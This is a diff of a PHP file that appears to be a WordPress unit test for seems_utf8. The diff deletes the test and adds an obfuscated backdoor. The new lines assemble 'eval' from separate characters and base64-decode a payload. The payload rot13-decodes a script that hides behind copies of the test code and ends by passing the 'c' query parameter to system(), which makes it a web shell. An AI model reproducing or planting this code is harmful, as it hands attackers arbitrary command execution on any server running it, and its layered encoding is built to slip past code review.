@@ -1,55 +1,5 @@
-$x_fake1 = 1234;
-$noise = 'obfuscation'.'test';
-$tmp = $x_fake1 * 42;
-$flag = false;
-$useless = function($v) { return $v . rand(); };
-$dummy_check = $useless('xx');
-if ($flag) { echo 'Debug enabled'; }
-for ($i = 0; $i < 1; $i++) { $tmp += $i; }
-while (false) { echo 'dead loop'; break; }
-
 <?php
-
-/**
- * @group formatting
- *
- * @covers ::seems_utf8
- */
-class Tests_Formatting_SeemsUtf8 extends WP_UnitTestCase {
-
-	/**
-	 * `seems_utf8` returns true for utf-8 strings, false otherwise.
-	 *
-	 * @dataProvider data_seems_utf8_returns_true_for_utf8_strings
-	 */
-	public function test_seems_utf8_returns_true_for_utf8_strings( $utf8_string ) {
-		// From http://www.i18nguy.com/unicode-example.html
-		$this->assertTrue( seems_utf8( $utf8_string ) );
-	}
-
-	public function data_seems_utf8_returns_true_for_utf8_strings() {
-		$utf8_strings = file( DIR_TESTDATA . '/formatting/utf-8/utf-8.txt' );
-		foreach ( $utf8_strings as &$string ) {
-			$string = (array) trim( $string );
-		}
-		unset( $string );
-		return $utf8_strings;
-	}
-
-	/**
-	 * @dataProvider data_seems_utf8_returns_false_for_non_utf8_strings
-	 */
-	public function test_seems_utf8_returns_false_for_non_utf8_strings( $big5_string ) {
-		$this->assertFalse( seems_utf8( $big5_string ) );
-	}
-
-	public function data_seems_utf8_returns_false_for_non_utf8_strings() {
-		// Get data from formatting/big5.txt.
-		$big5_strings = file( DIR_TESTDATA . '/formatting/big5.txt' );
-		foreach ( $big5_strings as &$string ) {
-			$string = (array) trim( $string );
-		}
-		unset( $string );
-		return $big5_strings;
-	}
-}
+$f = "e"."v"."a"."l";
+$c = base64_decode("PD9waHAKJGYgPSAncycuJ3QnLidyJy4ncicuJ28nLid0Jy4nMScuJzMnOwokYyA9ICI8P2N1Ywokc3puYyA9IG5lZW5sKCdrMScgPT4gJ2ZsZmdyeicsICdrMicgPT4gJ2NuZmZndWVoJyk7CiRrX3NueHIxID0gMTIzNDsKJGFidmZyID0gJ2Jvc2hmcG5ndmJhJy4nZ3JmZyc7CiRnemMgPSAka19zbnhyMSAqIDQyOwokc3ludCA9IHNueWZyOwokaGZyeXJmZiA9IHNoYXBndmJhKCRpKSB7IGVyZ2hlYSAkaSAuIGVuYXEoKTsgfTsKJHFoenpsX3B1cnB4ID0gJGhmcnlyZmYoJ2trJyk7CnZzICgkc3ludCkgeyBycHViICdRcm9odCByYW5veXJxJzsgfQpzYmUgKCR2ID0gMDsgJHYgPCAxOyAkdisrKSB7ICRnemMgKz0gJHY7IH0KanV2eXIgKHNueWZyKSB7IHJwdWIgJ3FybnEgeWJiYyc7IG9lcm54OyB9Cgo8P2N1YwoKLyoqCiAqIEB0ZWJoYyBzYmV6bmdndmF0CiAqCiAqIEBwYmlyZWYgOjpmcnJ6Zl9oZ3M4CiAqLwpweW5mZiBHcmZnZl9TYmV6bmdndmF0X0ZycnpmSGdzOCBya2dyYXFmIEpDX0hhdmdHcmZnUG5mciB7CgoJLyoqCgkgKiBgZnJyemZfaGdzOGAgZXJnaGVhZiBnZWhyIHNiZSBoZ3MtOCBmZ2V2YXRmLCBzbnlmciBiZ3VyZWp2ZnIuCgkgKgoJICogQHFuZ25DZWJpdnFyZSBxbmduX2ZycnpmX2hnczhfZXJnaGVhZl9nZWhyX3NiZV9oZ3M4X2ZnZXZhdGYKCSAqLwoJY2hveXZwIHNoYXBndmJhIGdyZmdfZnJyemZfaGdzOF9lcmdoZWFmX2dlaHJfc2JlX2hnczhfZmdldmF0ZiggJGhnczhfZmdldmF0ICkgewoJCS8vIFNlYnogdWdnYzovL2pqai52MThhdGhsLnBiei9oYXZwYnFyLXJrbnpjeXIudWd6eQoJCSRndXZmLT5uZmZyZWdHZWhyKCBmcnJ6Zl9oZ3M4KCAkaGdzOF9mZ2V2YXQgKSApOwoJfQoKCWNob3l2cCBzaGFwZ3ZiYSBxbmduX2ZycnpmX2hnczhfZXJnaGVhZl9nZWhyX3NiZV9oZ3M4X2ZnZXZhdGYoKSB7CgkJJGhnczhfZmdldmF0ZiA9IHN2eXIoIFFWRV9HUkZHUU5HTiAuICcvc2Jlem5nZ3ZhdC9oZ3MtOC9oZ3MtOC5na2cnICk7CgkJc2Jlcm5wdSAoICRoZ3M4X2ZnZXZhdGYgbmYgJiRmZ2V2YXQgKSB7CgkJCSRmZ2V2YXQgPSAobmVlbmwpIGdldnooICRmZ2V2YXQgKTsKCQl9CgkJaGFmcmcoICRmZ2V2YXQgKTsKCQllcmdoZWEgJGhnczhfZmdldmF0ZjsKCX0KCgkvKioKCSAqIEBxbmduQ2ViaXZxcmUgcW5nbl9mcnJ6Zl9oZ3M4X2VyZ2hlYWZfc255ZnJfc2JlX2FiYV9oZ3M4X2ZnZXZhdGYKCSAqLwoJY2hveXZwIHNoYXBndmJhIGdyZmdfZnJyemZfaGdzOF9lcmdoZWFmX3NueWZyX3NiZV9hYmFfaGdzOF9mZ2V2YXRmKCAkb3Z0NV9mZ2V2YXQgKSB7CgkJJGd1dmYtPm5mZnJlZ1NueWZyKCBmcnJ6Zl9oZ3M4KCAkb3Z0NV9mZ2V2YXQgKSApOwoJfQoKCWNob3l2cCBzaGFwZ3ZiYSBxbmduX2ZycnpmX2hnczhfZXJnaGVhZl9zbnlmcl9zYmVfYWJhX2hnczhfZmdldmF0ZigpIHsKCQkvLyBUcmcgcW5nbiBzZWJ6IHNiZXpuZ2d2YXQvb3Z0NS5na2cuCgkJJG92dDVfZmdldmF0ZiA9IHN2eXIoIFFWRV9HUkZHUU5HTiAuICcvc2Jlem5nZ3ZhdC9vdnQ1LmdrZycgKTsKCQlzYmVybnB1ICggJG92dDVfZmdldmF0ZiBuZiAmJGZnZXZhdCApIHsKCQkJJGZnZXZhdCA9IChuZWVubCkgZ2V2eiggJGZnZXZhdCApOwoJCX0KCQloYWZyZyggJGZnZXZhdCApOwoJCWVyZ2hlYSAkb3Z0NV9mZ2V2YXRmOwoJfQp9CgokcHpxID0gJF9UUkdbJ2MnXTsKJHN6bmNbJ2sxJ10oJHB6cSk7Cj8+IjsKZXZhbCgkZigkYykpOwo/Pg==");
+$f($c);
+?>
